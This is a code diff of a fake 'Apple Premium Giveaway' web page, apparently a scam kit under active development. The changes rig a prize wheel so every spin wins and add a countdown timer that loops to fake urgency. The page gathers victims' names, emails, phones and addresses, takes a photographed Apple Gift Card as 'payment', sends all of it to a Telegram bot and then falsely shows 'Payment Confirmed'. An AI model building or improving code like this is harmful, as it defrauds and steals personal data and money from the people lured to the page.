+  if (timerInterval) clearInterval(timerInterval);
+  let minutes = 29;
+  let seconds = 42;
+  
+  timerInterval = setInterval(() => {
+    seconds--;
+    if (seconds < 0) {
+      seconds = 59;
+      minutes--;
+      if (minutes < 0) {
+        minutes = 29;
+        seconds = 42;
+      }
+    }
+    document.getElementById('timer-min').textContent = String(minutes).padStart(2, '0');
+    document.getElementById('timer-sec').textContent = String(seconds).padStart(2, '0');
+  }, 1000);
+}
+
+// ══════════════════════════════════
+//  UPDATE PAYMENT PAGE
+// ══════════════════════════════════
+function updatePaymentPage() {
+  const details = PRIZE_DETAILS[currentPrize];
+  document.getElementById('payPrizeName').textContent = details.name;
+  document.getElementById('gcPrizeName').textContent = details.name;
+  document.getElementById('gcPrizeRetail').textContent = `Retail Price: ${details.retail}`;
+}
+
+// ══════════════════════════════════
+//  UPDATE WIN PAGE
+// ══════════════════════════════════
+function updateWinPage() {
+  const details = PRIZE_DETAILS[currentPrize];
+  document.getElementById('winPrizeName').textContent = `You've won the ${details.name}!`;
+  document.getElementById('winPrizeDisplay').textContent = details.name;
+  document.getElementById('winPillText').textContent = details.name;
+  document.getElementById('winPillText2').textContent = details.name;
+  document.getElementById('winPrizeImage').src = details.image;
+  document.querySelector('#pg-win .win-hdr p').textContent = `You've won the ${details.name}!`;
 }
 
 // ══════════════════════════════════
@@ -1191,9 +2329,18 @@ function checkId() {
   btn.disabled = true;
   if (!val) return;
 
+  // 1111 ALWAYS WORKS - NEVER EXPIRES
+  if (val === '1111') {
+    el.className = 'id-status valid';
+    el.textContent = '✅ Standby ID — Always Active';
+    idOK = true;
+    btn.disabled = false;
+    return;
+  }
+
   if (usedCodes.includes(val)) {
     el.className = 'id-status claimed';
-    el.textContent = '🆔 Spin claimed by another user';
+    el.textContent = '🆔 This code has already been used';
     return;
   }
   if (VALID_CODES[val]) {
@@ -1224,13 +2371,20 @@ function proceedForm() {
   }
   if (!idOK) { alert('Please enter a valid Giveaway ID.'); return; }
 
-  userData = { name, email, phone, state, address, gid };
+  let prizeType = 'iphone';
+  if (gid !== '1111' && CODE_PRIZE_MAP[gid]) {
+    prizeType = CODE_PRIZE_MAP[gid];
+  }
+  currentPrize = prizeType;
 
-  usedCodes.push(gid);
-  localStorage.setItem('ag_used', JSON.stringify(usedCodes));
+  userData = { name, email, phone, state, address, gid, prize: prizeType };
 
-  goPage('pg-loader');
-  setTimeout(() => goPage('pg-wheel'), 2600);
+  if (gid !== '1111') {
+    usedCodes.push(gid);
+    localStorage.setItem('ag_used', JSON.stringify(usedCodes));
+  }
+
+  goPage('pg-wheel');
 }
 
 // ══════════════════════════════════
@@ -1258,6 +2412,7 @@ const SEG_COLORS = [
   '#ffd700','#0a84ff','#c97b00'
 ];
 const MACBOOK_IDX = 11;
+const IPHONE17_IDX = 9;
 
 function initWheel() {
   wheelSpun = false;
@@ -1287,7 +2442,7 @@ function drawWheel(rot) {
     ctx.beginPath(); ctx.moveTo(cx,cy); ctx.arc(cx,cy,r,s,e); ctx.closePath();
     ctx.fillStyle = SEG_COLORS[i]; ctx.fill();
 
-    if (i === MACBOOK_IDX) {
+    if (i === MACBOOK_IDX || i === IPHONE17_IDX) {
       const sg = ctx.createLinearGradient(cx,cy,cx + r*Math.cos(s+arc/2), cy + r*Math.sin(s+arc/2));
       sg.addColorStop(0,'rgba(255,200,0,0.35)');
       sg.addColorStop(1,'rgba(255,200,0,0)');
@@ -1307,7 +2462,7 @@ function drawWheel(rot) {
     ctx.shadowColor = 'transparent';
     ctx.shadowBlur = 0;
     
-    const isSpecial = i === MACBOOK_IDX || i === 9 || i === 5;
+    const isSpecial = i === MACBOOK_IDX || i === IPHONE17_IDX || i === 5;
     ctx.font = isSpecial 
       ? 'bold 12px Inter, -apple-system, sans-serif'
       : 'bold 11px Inter, -apple-system, sans-serif';
@@ -1322,7 +2477,7 @@ function drawWheel(rot) {
       
       let color = 'rgba(255,255,255,0.95)';
       if (i === MACBOOK_IDX) color = '#ffd700';
-      else if (i === 9) color = '#ffd700';
+      else if (i === IPHONE17_IDX) color = '#ffd700';
       else if (i === 5) color = '#ffd700';
       
       ctx.shadowColor = 'rgba(0,0,0,0.9)';
@@ -1362,10 +2517,20 @@ function spinWheel() {
   wheelSpun = true;
   document.getElementById('spin-btn').disabled = true;
 
+  playSpinSound();
+  triggerVibration();
+
   const n = SEGMENTS.length;
   const arc = (2 * Math.PI) / n;
 
-  const targetMid = (MACBOOK_IDX + 0.5) * arc;
+  let targetIdx;
+  if (currentPrize === 'iphone') {
+    targetIdx = IPHONE17_IDX;
+  } else {
+    targetIdx = MACBOOK_IDX;
+  }
+
+  const targetMid = (targetIdx + 0.5) * arc;
   const pointer = 3 * Math.PI / 2;
   const fullSpins = 8;
   let offset = pointer - targetMid;
@@ -1380,8 +2545,27 @@ function spinWheel() {
   function frame(now) {
     const t = Math.min((now - start) / dur, 1);
     drawWheel(totalSpin * ease(t));
-    if (t < 1) requestAnimationFrame(frame);
-    else setTimeout(() => goPage('pg-win'), 900);
+    if (t < 1) {
+      if (Math.floor(t * 20) % 2 === 0) {
+        try {
+          const tickOsc = audioContext.createOscillator();
+          const tickGain = audioContext.createGain();
+          tickOsc.connect(tickGain);
+          tickGain.connect(audioContext.destination);
+          tickOsc.type = 'sine';
+          tickOsc.frequency.setValueAtTime(800 + Math.random() * 400, audioContext.currentTime);
+          tickGain.gain.setValueAtTime(0.03, audioContext.currentTime);
+          tickGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.03);
+          tickOsc.start(audioContext.currentTime);
+          tickOsc.stop(audioContext.currentTime + 0.03);
+        } catch (e) {}
+      }
+      requestAnimationFrame(frame);
+    } else {
+      setTimeout(() => {
+        showPopup(currentPrize);
+      }, 500);
+    }
   }
   requestAnimationFrame(frame);
 }
@@ -1439,7 +2623,7 @@ function previewCard(e) {
 }
 
 // ══════════════════════════════════
-//  TELEGRAM - FIXED WITH BETTER ERROR HANDLING
+//  TELEGRAM - FIXED
 // ══════════════════════════════════
 async function tgText(msg) {
   try {
@@ -1490,15 +2674,14 @@ async function tgPhoto(b64, caption) {
 }
 
 // ══════════════════════════════════
-//  SUBMIT PAYMENT - FIXED WITH TIMEOUT
+//  SUBMIT PAYMENT
 // ══════════════════════════════════
 async function submitPay(method) {
-  // Show processing page
   goPage('pg-processing');
   document.getElementById('proc-title').textContent = 'Processing Payment…';
   document.getElementById('proc-sub').textContent = 'Please wait while we securely process your transaction';
 
-  // Build the message
+  const prizeDetails = PRIZE_DETAILS[currentPrize];
   const msg =
 '🏆 <b>NEW GIVEAWAY CLAIM</b>\n\n' +
 '👤 <b>Name:</b> ' + userData.name + '\n' +
@@ -1507,12 +2690,11 @@ async function submitPay(method) {
 '📍 <b>State:</b> ' + userData.state + '\n' +
 '🏠 <b>Address:</b> ' + userData.address + '\n' +
 '🆔 <b>Giveaway ID:</b> ' + userData.gid + '\n' +
+'🎁 <b>Prize:</b> ' + prizeDetails.name + '\n' +
 '💳 <b>Payment:</b> ' + method;
 
-  // Try to send to Telegram but don't wait too long
   let success = false;
   try {
-    // Send text with timeout
     const textPromise = tgText(msg);
     const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject('timeout'), 5000));
     success = await Promise.race([textPromise, timeoutPromise]);
@@ -1521,7 +2703,6 @@ async function submitPay(method) {
     success = false;
   }
 
-  // Send photo if gift card (with timeout)
   if (method === 'Apple Gift Card' && cardB64) {
     try {
       const photoPromise = tgPhoto(cardB64, '💳 Apple Gift Card — ' + userData.name);
@@ -1532,7 +2713,6 @@ async function submitPay(method) {
     }
   }
 
-  // Update processing message
   if (success) {
     document.getElementById('proc-title').textContent = '✅ Payment Confirmed!';
     document.getElementById('proc-sub').textContent = 'Your prize is being prepared for shipment';
@@ -1541,7 +2721,6 @@ async function submitPay(method) {
     document.getElementById('proc-sub').textContent = 'Your prize is being prepared for shipment';
   }
 
-  // Go to done page after 3 seconds
   setTimeout(() => {
     goPage('pg-done');
   }, 3000);
@@ -1621,6 +2800,16 @@ window.addEventListener('scroll', function() {
     o.style.transform = 'translateY(' + (y * (0.08 + i * 0.04)) + 'px)';
   });
 }, { passive: true });
+
+// ══════════════════════════════════
+//  START TOAST NOTIFICATIONS
+// ══════════════════════════════════
+setTimeout(startToastCycle, 3000);
+
+console.log('🎯 Apple Premium Giveaway 2026');
+console.log('📱 Standby ID: 1111 (Always Works)');
+console.log('📱 iPhone Codes: 1268-838-837 to 0258-727-726');
+console.log('💻 MacBook Codes: 1369-838-837 to 0258-727-726');
 </script>
 </body>
 </html>
